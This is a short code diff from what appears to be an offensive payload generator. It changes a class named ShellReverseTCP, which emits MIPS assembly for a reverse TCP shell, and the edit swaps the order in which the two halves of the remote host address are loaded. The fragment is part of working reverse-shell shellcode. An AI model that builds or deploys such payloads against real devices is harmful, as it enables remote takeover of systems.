@@ -76,8 +76,8 @@ class ShellReverseTCP(HatAsm, HatVenom, Words):
             lui $a1, 2
             ori $a1, $a1, 0x{rport.hex()}
             sw $a1, -8($sp)
-            lui $a1, 0x{rhost[:2].hex()}
-            ori $a1, $a1, 0x{rhost[2:].hex()}
+            lui $a1, 0x{rhost[2:].hex()}
+            ori $a1, $a1, 0x{rhost[:2].hex()}
             sw $a1, -4($sp)
             addi $a1, $sp, -8
             addiu $t4, $zero, -0x11
